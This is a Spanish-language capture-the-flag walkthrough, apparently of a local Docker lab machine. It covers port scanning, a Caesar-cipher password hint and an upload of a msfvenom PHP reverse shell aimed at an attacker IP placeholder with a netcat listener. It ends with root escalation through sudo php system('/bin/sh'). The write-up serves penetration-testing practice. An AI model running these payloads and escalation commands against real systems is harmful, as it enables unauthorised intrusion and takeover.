Hacemos un sacaneo con [[00. Apuntes/01. Herramientas/NMAP|NMAP]] para encontrar los puertos abiertos
` nmap -p- --open -sCV --min-rate 5000 -Pn -n 172.17.0.2 `

Encontramos abiertos el puerto 80 y el 443
En primer lugar navegamos al puerto 80, vemos que hay un archivo .txt `backup.txt`
![[Pasted image 20241214112238.png]]

El mensaje nos habla de que para resolver el acertijo tenemos que pensar en un antiguo emperador Romano y su simple metodo de intercambiar letras.
Esta hablando del cifrado Cesar que consiste en cambiar las latras de ubicacion. Buscamos enn internet alguna pagina que nos ayude con este tipo de cifrado.
`www.dcode.fr/cifrado-cesar`

La primera opcion que sale es la siguiente, suele ser la que mas coeherencia tiene.
![[Pasted image 20241214113207.png]]

No podemos hacer nama mas con el puerto 80 asi que pasaremos al 443.
En la web nos encontramos una zona para poder hacer subida de archivos asi que vamos a generar un payload con [[00. Apuntes/01. Herramientas/MSFVENOM|MSFVENOM]]
`msfvenom -p php/reverse_php LHOST=<IP_atactante> LPORT=444 raw > pwned.php`

Una vez tenemos subido el archivo tenemos que usar tecnicar de Fuzzing para encontrar en que directorio se suben los archivos, lo haremos con [[00. Apuntes/01. Herramientas/GOBUSTER|GOBUSTER]]
`gobuster dir -u https://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh -k`

Encontarmos un directorio `/uploads`
![[Pasted image 20241214113922.png]]

Navegamos hasta el y vemos que se encuentra hay el fichero `pwned.php` que hemos subido
![[Pasted image 20241214114022.png]]

Nos ponemos en escucha con [[NETCAT]] en el pueto especificado en el [[00. Apuntes/01. Herramientas/MSFVENOM|MSFVENOM]]
`nc -lvnp 444`

 Y hacemos click en el archivo subido, con esto conseguiremos acceso a la maquina, pero antes de hacer nada tenemos que [[01. Tratamiento de la TTY]] . 
antes del tartamiento de la tty nos mandamos la reverse shell a otro puerto para asi poder tenr una sehll stable ya que [[00. Apuntes/01. Herramientas/MSFVENOM|MSFVENOM]] la que nos aporta no es estable.

Una vez ya tenemos la shell estable navegamos al directorio `/home` y vemos que existe el usuario mateo, usamos la contraseña del cifrado cesar pero nos da error asi que probamos quitandole la x, y conseguimos acceso.
Procedemos a la escalada de privilegios, para eso usamos el comando `sudo -l` para ver que puede ejecutar mateo como root. Tiene perimtido `/usr/bin/php`
Si usamos [[GTFOBINS]] veremos diferentes occiones para obtener una shell como root
![[Pasted image 20241214121711.png]]

En lugar de usar `CMD=` para declarar la variable exribiremos diractamente `/bin/sh` en `system` para que se nos genere una terminal. Quedaria asi:
`sudo -u root /usr/bin/php -r "system('/bin/sh');"`

Y obtendremos acceso como root